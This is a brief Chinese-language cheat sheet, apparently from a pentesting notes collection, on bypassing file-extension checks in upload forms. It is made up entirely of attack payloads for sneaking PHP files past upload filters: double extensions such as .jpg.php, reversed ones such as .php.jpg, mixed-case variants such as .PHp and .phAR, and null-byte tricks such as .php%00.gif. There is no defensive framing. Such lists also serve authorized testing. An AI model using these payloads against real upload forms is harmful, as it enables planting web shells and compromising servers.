### 绕过文件扩展名检查

1.双扩展
```
.jpg.php
.png.ph5
```

2.反向双扩展
```
.php.jpg
.php.png
```

3.随机大小写
```
.PHp
.pHp5
.phAR
```

4.空字节
```
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```
